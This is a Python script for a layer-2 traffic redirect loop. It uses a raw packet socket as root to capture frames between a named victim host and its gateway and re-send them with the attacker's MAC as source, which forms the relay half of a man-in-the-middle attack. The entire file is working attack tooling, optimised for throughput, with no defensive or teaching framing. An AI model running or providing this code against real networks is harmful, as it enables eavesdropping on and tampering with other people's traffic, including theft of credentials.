#!/usr/bin/env python3
# fast_l2_redirect_optimized.py
import os
import sys
import socket
import struct
import argparse
from fcntl import ioctl

# Constants
ETH_P_ALL = 0x0003
SIOCGIFHWADDR = 0x8927
SIOCGIFINDEX  = 0x8933
MAX_FRAME = 65536

# load settings (keeps existing behavior)
settings = {}
if os.path.exists("puller.settings"):
    with open("puller.settings", "r") as f:
        for line in f:
            parts = line.split()
            if len(parts) >= 2:
                settings[parts[0].strip()] = parts[1].strip()

def if_hwaddr(ifname, ioctl_sock=None):
    """Return 6-byte MAC as bytes."""
    # reuse ioctl socket if provided
    s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        req = struct.pack('256s', ifname[:15].encode())
        info = ioctl(s.fileno(), SIOCGIFHWADDR, req)
        return info[18:24]
    finally:
        if ioctl_sock is None:
            s.close()

def if_index(ifname, ioctl_sock=None):
    s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        ifreq = struct.pack('256s', ifname[:15].encode())
        res = ioctl(s.fileno(), SIOCGIFINDEX, ifreq)
        return struct.unpack('i', res[16:20])[0]
    finally:
        if ioctl_sock is None:
            s.close()

def resolve_mac_ip(iface, ip):
    """
    Try to resolve via 'ip neigh show to <ip>'.
    Returns 6-byte MAC or None.
    """
    import subprocess
    try:
        out = subprocess.check_output(["ip", "neigh", "show", "to", ip], stderr=subprocess.DEVNULL)
        text = out.decode(errors="ignore")
    except Exception:
        return None
    # scan for MAC in output quickly
    for token in text.split():
        if token.count(':') == 5:
            try:
                return bytes(int(b, 16) for b in token.split(':'))
            except Exception:
                continue
    return None

def mac_str_to_bytes(mac):
    return bytes(int(x,16) for x in mac.split(':'))

def main(IFACE, VICTIM, GATEWAY):
    """
    Maintain this signature. Fast layer2 redirect loop:
      - listens on IFACE (AF_PACKET raw)
      - rewrites frames between VICTIM <-> GATEWAY swapping dst/src and using attacker MAC
    """
    if os.geteuid() != 0:
        print("run as root")
        sys.exit(1)

    # Resolve MACs once
    victim_mac = resolve_mac_ip(IFACE, VICTIM)
    gateway_mac = resolve_mac_ip(IFACE, GATEWAY)
    if not victim_mac or not gateway_mac:
        print("couldn't resolve macs")
        sys.exit(1)

    # reuse ioctl socket to get attacker mac and ifindex
    ioctl_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        attacker_mac = if_hwaddr(IFACE, ioctl_sock)
        ifindex = if_index(IFACE, ioctl_sock)
    finally:
        ioctl_sock.close()

    # prepare raw AF_PACKET socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    # bigger buffers
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    s.bind((IFACE, 0))

    # preallocated buffers and memoryviews
    recv_buf = bytearray(MAX_FRAME)
    send_buf = bytearray(MAX_FRAME)
    recv_mv = memoryview(recv_buf)
    send_mv = memoryview(send_buf)

    v_mac = victim_mac
    g_mac = gateway_mac
    a_mac = attacker_mac
    a_mac_bytes = a_mac  # alias

    # quick printable
    def mac_to_str(b):
        return ':'.join(f"{x:02x}" for x in b)

    print("attacker mac:", mac_to_str(a_mac))
    print("victim mac:", mac_to_str(v_mac))
    print("gateway mac:", mac_to_str(g_mac))
    print("starting loop...")

    # localize functions/vars for speed
    recvmsg_into = s.recvmsg_into
    send = s.send
    v_mac_local = v_mac
    g_mac_local = g_mac
    a_mac_local = a_mac_bytes
    MAX_READ = MAX_FRAME

    try:
        while True:
            # recv into preallocated buffer (zero allocation)
            nbytes, ancdata, flags, addr = recvmsg_into([recv_mv], 0)
            if nbytes <= 14:
                continue
            frame = recv_mv[:nbytes]  # memoryview referencing recv_buf

            # source MAC at bytes 6:12
            src = bytes(frame[6:12])  # small 6-byte bytes object
            # ignore frames we injected
            if src == a_mac_local:
                continue

            # Decide direction and prepare send buffer without allocating new bytearray
            if src == v_mac_local:
                # victim -> gateway: set dst=g_mac, src=attacker
                # copy header (first 14 bytes) and payload
                # write dst and src quickly into send buffer, then copy payload
                send_mv[0:6] = g_mac_local
                send_mv[6:12] = a_mac_local
                # copy remaining header bytes (ethertype etc) and payload
                send_mv[12:nbytes] = frame[12:nbytes]   # copies all bytes from 12..nbytes-1
                # send memoryview slice (no new allocation)
                send(send_mv[:nbytes])
            elif src == g_mac_local:
                # gateway -> victim
                send_mv[0:6] = v_mac_local
                send_mv[6:12] = a_mac_local
                send_mv[12:nbytes] = frame[12:nbytes]
                send(send_mv[:nbytes])
            else:
                # unrelated frame; skip
                continue

    except KeyboardInterrupt:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Fast L2 redirect (optimized). Requires root.")
    parser.add_argument("iface", help="interface name (e.g. eth0)")
    parser.add_argument("victim", help="victim IP (used to resolve MAC via 'ip neigh')")
    parser.add_argument("gateway", help="gateway IP (used to resolve MAC via 'ip neigh')")
    parser.add_argument("--victim-mac", help="victim MAC (if you want to provide it instead of resolving)")
    parser.add_argument("--gateway-mac", help="gateway MAC (if you want to provide it instead of resolving)")
    args = parser.parse_args()

    # allow user-supplied MACs to bypass neighbor lookup (faster startup)
    if args.victim_mac:
        victim_bytes = mac_str_to_bytes(args.victim_mac)
    else:
        victim_bytes = None
    if args.gateway_mac:
        gateway_bytes = mac_str_to_bytes(args.gateway_mac)
    else:
        gateway_bytes = None

    # If user passed MACs, we need to patch resolve_mac_ip to return them.
    if victim_bytes and gateway_bytes:
        # call main with provided bytes by temporarily wrapping resolve_mac_ip
        _resolve = resolve_mac_ip
        def _tmp_resolve(iface, ip):
            if ip == args.victim:
                return victim_bytes
            if ip == args.gateway:
                return gateway_bytes
            return _resolve(iface, ip)
        resolve_mac_ip = _tmp_resolve  # monkey patch for main usage

    main(args.iface, args.victim, args.gateway)
